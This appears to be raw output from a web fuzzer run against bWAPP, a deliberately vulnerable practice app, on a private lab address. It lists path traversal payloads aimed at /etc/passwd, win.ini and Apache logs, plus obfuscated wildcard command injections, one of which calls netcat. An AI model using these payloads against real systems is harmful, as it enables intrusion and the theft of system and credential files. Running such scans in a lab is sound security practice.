1,200,50L,58W,http://192.168.1.86/bWAPP/../
109,200,0L,0W,http://192.168.1.86/bWAPP/config.inc.php
116,200,75L,140W,http://192.168.1.86/bWAPP/install.php
11,302,0L,0W,http://192.168.1.86/bWAPP//???/
12,302,0L,0W,http://192.168.1.86/bWAPP/
13,302,0L,0W,http://192.168.1.86/bWAPP/
66,302,0L,0W,http://192.168.1.86/bWAPP/
70,302,0L,0W,http://192.168.1.86/bWAPP/
88,302,0L,0W,http://192.168.1.86/bWAPP/
98,302,0L,0W,http://192.168.1.86/bWAPP/
117,302,0L,0W,http://192.168.1.86/bWAPP/
125,302,0L,0W,http://192.168.1.86/bWAPP/
129,302,0L,0W,http://192.168.1.86/bWAPP/
143,302,0L,0W,http://192.168.1.86/bWAPP/
148,302,0L,0W,http://192.168.1.86/bWAPP/
197,302,0L,0W,http://192.168.1.86/bWAPP/
198,302,0L,0W,http://192.168.1.86/bWAPP/
224,302,0L,0W,http://192.168.1.86/bWAPP/
225,302,0L,0W,http://192.168.1.86/bWAPP/
240,302,0L,0W,http://192.168.1.86/bWAPP/
243,302,0L,0W,http://192.168.1.86/bWAPP/
253,302,0L,0W,http://192.168.1.86/bWAPP/
257,302,0L,0W,http://192.168.1.86/bWAPP/
309,302,0L,0W,http://192.168.1.86/bWAPP/
314,302,0L,0W,http://192.168.1.86/bWAPP/
325,302,0L,0W,http://192.168.1.86/bWAPP/
356,302,0L,0W,http://192.168.1.86/bWAPP/
371,302,0L,0W,http://192.168.1.86/bWAPP/
381,302,0L,0W,http://192.168.1.86/bWAPP/
432,302,0L,0W,http://192.168.1.86/bWAPP/
463,302,0L,0W,http://192.168.1.86/bWAPP/
478,302,0L,0W,http://192.168.1.86/bWAPP/
479,302,0L,0W,http://192.168.1.86/bWAPP/
489,302,0L,0W,http://192.168.1.86/bWAPP/
541,302,0L,0W,http://192.168.1.86/bWAPP/
554,302,0L,0W,http://192.168.1.86/bWAPP/
559,302,0L,0W,http://192.168.1.86/bWAPP/
590,302,0L,0W,http://192.168.1.86/bWAPP/
605,302,0L,0W,http://192.168.1.86/bWAPP/
615,302,0L,0W,http://192.168.1.86/bWAPP/
666,302,0L,0W,http://192.168.1.86/bWAPP/
679,302,0L,0W,http://192.168.1.86/bWAPP/
684,302,0L,0W,http://192.168.1.86/bWAPP/
715,302,0L,0W,http://192.168.1.86/bWAPP/
730,302,0L,0W,http://192.168.1.86/bWAPP/
740,302,0L,0W,http://192.168.1.86/bWAPP/
741,302,0L,0W,http://192.168.1.86/bWAPP/
793,302,0L,0W,http://192.168.1.86/bWAPP/
806,302,0L,0W,http://192.168.1.86/bWAPP/
811,302,0L,0W,http://192.168.1.86/bWAPP/
842,302,0L,0W,http://192.168.1.86/bWAPP/
857,302,0L,0W,http://192.168.1.86/bWAPP/
867,302,0L,0W,http://192.168.1.86/bWAPP/
868,302,0L,0W,http://192.168.1.86/bWAPP/
869,302,0L,0W,http://192.168.1.86/bWAPP/
871,302,0L,0W,http://192.168.1.86/bWAPP//???/?at%20/???/????w?
873,302,0L,0W,http://192.168.1.86/bWAPP/
875,302,0L,0W,http://192.168.1.86/bWAPP//???/???/n?%202130706433%2080
876,302,0L,0W,http://192.168.1.86/bWAPP/
877,302,0L,0W,http://192.168.1.86/bWAPP/
878,302,0L,0W,http://192.168.1.86/bWAPP/
879,302,0L,0W,http://192.168.1.86/bWAPP/
880,302,0L,0W,http://192.168.1.86/bWAPP/
881,302,0L,0W,http://192.168.1.86/bWAPP/
882,302,0L,0W,http://192.168.1.86/bWAPP/
7,400,10L,42W,http://192.168.1.86/bWAPP/%uff0e%uff0e%u2215
8,400,10L,42W,http://192.168.1.86/bWAPP/%uff0e%uff0e%u2216
23,400,10L,42W,http://192.168.1.86/bWAPP/../../etc/passwd
25,400,10L,42W,http://192.168.1.86/bWAPP/../../../etc/passwd
27,400,10L,42W,http://192.168.1.86/bWAPP/../../../../etc/passwd
29,400,10L,42W,http://192.168.1.86/bWAPP/../../../../../etc/passwd
31,400,10L,42W,http://192.168.1.86/bWAPP/../../../../../../etc/passwd
33,400,10L,42W,http://192.168.1.86/bWAPP/../../../../../../../etc/passwd
35,400,10L,42W,http://192.168.1.86/bWAPP/../../../../../../../../etc/passwd
37,400,10L,42W,http://192.168.1.86/bWAPP/../../../../../../../../../etc/passwd
39,400,10L,42W,http://192.168.1.86/bWAPP/../../../../../../../../../../etc/passwd
41,400,10L,42W,http://192.168.1.86/bWAPP/../../../../../../../../../../../etc/passwd
43,400,10L,42W,http://192.168.1.86/bWAPP/../../../../../../../../../../../../etc/passwd
45,400,10L,42W,http://192.168.1.86/bWAPP/../../../../../../../../../../../../../etc/passwd
47,400,10L,42W,http://192.168.1.86/bWAPP/../../../../../../../../../../../../../../etc/passwd
49,400,10L,42W,http://192.168.1.86/bWAPP/../../../../../../../../../../../../../../../etc/passwd
51,400,10L,42W,http://192.168.1.86/bWAPP/../../../../../../../../../../../../../../../../etc/passwd
53,400,10L,42W,http://192.168.1.86/bWAPP/../../../../../../../../../../../../../../../../../etc/passwd
55,400,10L,42W,http://192.168.1.86/bWAPP/../../../../../../../../../../../../../../../../../../etc/passwd
57,400,10L,42W,http://192.168.1.86/bWAPP/../../../../../../../../../../../../../../../../../../../etc/passwd
59,400,10L,42W,http://192.168.1.86/bWAPP/../../../../../../../../../../../../../../../../../../../../etc/passwd
61,400,10L,42W,http://192.168.1.86/bWAPP/../../../../../../../../../../../../../../../../../../../../../etc/passwd
63,400,10L,42W,http://192.168.1.86/bWAPP/../../../../../../../../../../../../../../../../../../../../../../etc/passwd
67,400,10L,42W,http://192.168.1.86/bWAPP/../../../../../../etc/passwd&=%3C%3C%3C%3C
68,400,10L,42W,http://192.168.1.86/bWAPP/../../../administrator/inbox
69,400,10L,42W,http://192.168.1.86/bWAPP/../../../../../../../dev
113,400,10L,42W,http://192.168.1.86/bWAPP//../../../../pswd
128,400,10L,42W,http://192.168.1.86/bWAPP/m='../../../../../../../../etc/passwd'
131,400,10L,42W,http://192.168.1.86/bWAPP/../../windows/win.ini
151,400,10L,42W,http://192.168.1.86/bWAPP/../../apache/logs/error.log
152,400,10L,42W,http://192.168.1.86/bWAPP/../../apache/logs/access.log
